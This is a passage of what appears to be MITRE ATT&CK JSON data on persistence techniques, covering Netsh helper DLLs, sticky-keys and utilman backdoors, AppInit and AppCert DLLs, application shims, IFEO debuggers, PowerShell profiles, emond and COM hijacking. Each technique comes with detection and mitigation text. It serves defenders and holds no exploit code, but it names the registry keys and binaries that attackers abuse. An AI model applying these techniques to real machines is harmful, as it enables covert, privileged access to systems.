href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Writing Bad Malware for OSX)</a> There are tools available to perform these changes.\n\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Persistence on OS X)</a>","detection":"Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Metadata","Process: Process Creation","File: File Modification","Module: Module Load"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Allow applications via known hashes."},{"id":"M1045","name":"Code Signing","description":"Enforce that all binaries be signed by the correct Apple Developer IDs."},{"id":"M1047","name":"Audit","description":"Binaries can also be baselined for what dynamic libraries they require, and if an app requires a new dynamic library that wasn't included as part of an update, it should be investigated."}]},{"id":"T1546.007","name":"Netsh Helper DLL","description":"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. <a href=\"https://technet.microsoft.com/library/bb490939.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Netsh)</a> The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. <a href=\"https://github.com/outflankbv/NetshHelperBeacon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github Netsh Helper CS Beacon)</a> <a href=\"https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demaske Netsh Persistence)</a>","detection":"It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software. <a href=\"https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demaske Netsh Persistence)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Module: Module Load","Process: Process Creation"],"mitigations":[]},{"id":"T1546.008","name":"Accessibility Features","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. <a href=\"https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Hikit Rootkit)</a>\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). <a href=\"https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DEFCON2016 Sticky Keys)</a> The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. <a href=\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury 2014)</a>\n\nOther accessibility features exist that may also be leveraged in a similar fashion: <a href=\"https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DEFCON2016 Sticky Keys)</a> <a href=\"https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Narrator Accessibility Abuse)</a>\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>","detection":"Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Creation","File: File Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later. <a href=\"https://technet.microsoft.com/en-us/library/cc732713.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet RDP NLA)</a>"},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"If possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network. <a href=\"https://technet.microsoft.com/en-us/library/cc731150.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet RDP Gateway)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Adversaries can replace accessibility features binaries with alternate binaries to execute this technique. Identify and block potentially malicious software executed through accessibility features functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"}]},{"id":"T1546.009","name":"AppCert DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.","detection":"Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> <a href=\"https://forum.sysinternals.com/appcertdlls_topic12546.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysinternals AppCertDlls Oct 2007)</a>\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":["Windows"],"dataSources":["Module: Module Load","Command: Command Execution","Process: OS API Execution","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Adversaries install new AppCertDLL binaries to execute this technique. Identify and block potentially malicious software executed through AppCertDLLs functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"}]},{"id":"T1546.010","name":"AppInit DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. <a href=\"https://support.microsoft.com/en-us/kb/197571\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppInit Registry)</a> Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. <a href=\"https://msdn.microsoft.com/en-us/library/dn280412\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppInit Secure Boot)</a>","detection":"Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> \n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Module: Module Load","Windows Registry: Windows Registry Key Modification","Process: OS API Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Adversaries can install new AppInit DLLs binaries to execute this technique. Identify and block potentially malicious software executed through AppInit DLLs functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"},{"id":"M1051","name":"Update Software","description":"Upgrade to Windows 8 or later and enable secure boot."}]},{"id":"T1546.011","name":"Application Shimming","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom &amp; %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. <a href=\"http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Application Shimming)</a> Shims can also be abused to establish persistence by continuously being invoked by affected programs.","detection":"There are several public tools available that will detect shims that are currently available <a href=\"https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Black Hat 2015 App Shim)</a>:\n\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.","platforms":["Windows"],"dataSources":["File: File Modification","Module: Module Load","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1051","name":"Update Software","description":"Microsoft released an optional patch update - KB3045645 - that will remove the \"auto-elevate\" flag within the sdbinst.exe. This will prevent use of application shimming to bypass UAC."},{"id":"M1052","name":"User Account Control","description":"Changing UAC settings to \"Always Notify\" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions."}]},{"id":"T1546.012","name":"Image File Execution Options Injection","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). <a href=\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Blog IFEO Mar 2010)</a>\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. <a href=\"https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GFlags Mar 2017)</a> IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&lt;executable&gt;</code> where <code>&amp;lt;executable&amp;gt;</code> is the binary on which the debugger is attached. <a href=\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Blog IFEO Mar 2010)</a>\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). <a href=\"https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Silent Process Exit NOV 2017)</a> <a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe IFEO APR 2018)</a> Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. <a href=\"https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Silent Process Exit NOV 2017)</a> <a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe IFEO APR 2018)</a>\n\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges. <a href=\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury 2014)</a>\n\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to impair defenses by registering invalid debuggers that redirect and effectively disable various system and security applications. <a href=\"https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FSecure Hupigon)</a> <a href=\"https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Ushedix June 2008)</a>","detection":"Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. <a href=\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Blog IFEO Mar 2010)</a>\n\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[]},{"id":"T1546.013","name":"PowerShell Profile","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\n\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft About Profiles)</a> \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. <a href=\"https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Turla PowerShell May 2019)</a> \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. <a href=\"https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wits End and Shady PowerShell Profiles)</a>","detection":"Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. <a href=\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Archaeology PowerShell Cheat Sheet)</a> <a href=\"https://docs.microsoft.com/powershell/module/microsoft.powershell.core/about/about_profiles\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Profiles)</a> Example profile locations (user defaults as well as program-specific) include:\n\n* <code>$PsHome\\Profile.ps1</code>\n* <code>$PsHome\\Microsoft.{HostProgram}_profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1</code>\n\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.","platforms":["Windows"],"dataSources":["File: File Modification","Command: Command Execution","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Making PowerShell profiles immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence."},{"id":"M1045","name":"Code Signing","description":"Enforce execution of only signed PowerShell scripts. Sign profiles to avoid them from being modified."},{"id":"M1054","name":"Software Configuration","description":"Avoid PowerShell profiles if not needed. Use the -No Profile flag with when executing PowerShell scripts remotely to prevent local profiles and scripts from being executed."}]},{"id":"T1546.014","name":"Emond","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the Launch Daemon configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>. <a href=\"https://www.xorrior.com/emond-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: xorrior emond Jan 2018)</a> <a href=\"http://www.magnusviri.com/Mac/what-is-emond.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: magnusviri emond Apr 2016)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a>\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. <a href=\"https://www.xorrior.com/emond-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: xorrior emond Jan 2018)</a> <a href=\"http://www.magnusviri.com/Mac/what-is-emond.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: magnusviri emond Apr 2016)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a> Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.","detection":"Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.","platforms":["macOS"],"dataSources":["File: File Creation","Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling emond by removing the Launch Daemon plist file."}]},{"id":"T1546.015","name":"Component Object Model Hijacking","description":"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. <a href=\"https://msdn.microsoft.com/library/ms694363.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Component Object Model)</a>  References to various COM objects are stored in the Registry. \n\nAdversaries may use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. <a href=\"https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GDATA COM Hijacking)</a> An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. \n\nOne variation of COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata about COM objects, such as their interfaces and methods. Adversaries may modify Registry keys associated with TypeLibs to redirect legitimate COM object functionality to malicious scripts or payloads. Unlike traditional COM hijacking, which commonly 